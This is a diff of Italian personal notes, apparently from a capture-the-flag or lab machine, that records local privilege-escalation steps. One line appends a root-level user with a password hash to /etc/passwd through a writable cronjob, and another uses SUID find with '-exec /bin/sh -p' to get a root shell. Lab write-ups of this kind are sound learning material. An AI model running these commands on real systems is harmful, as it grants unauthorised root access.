@@ -41,3 +41,10 @@ creare un utente in `/etc/passwd`
 	- in questa vulnerabilità dentro un file era presente una bash particolare, non ricordo come l'ho trovata ma ti permetteva di eseguire cose come utente `vdsi`
 - con `pspy64` è stato trovato un cronjob che ogni tot scriveva, ho messo che poteva fare append in `/etc/passwd`
 	- `echo 'sbers:$1$09SwDPRJ$cjx.ZcPD2r4WNXSKZVNPO1:0:0:/root:/bin/bash' >> /etc/passwd`
+- altra vulnerabilità trovata:
+	- con `find /perm -u=s -type f 2>/dev/null`
+		- ho trovato che find è con un qualche `suid`
+		- facendo `ls -la /bin/find`
+			- ho scoperto che il suid di find é root, allora eseguo:
+				- `find . -exec /bin/sh -p \; -quit`
+				- trovato su GTFOBins
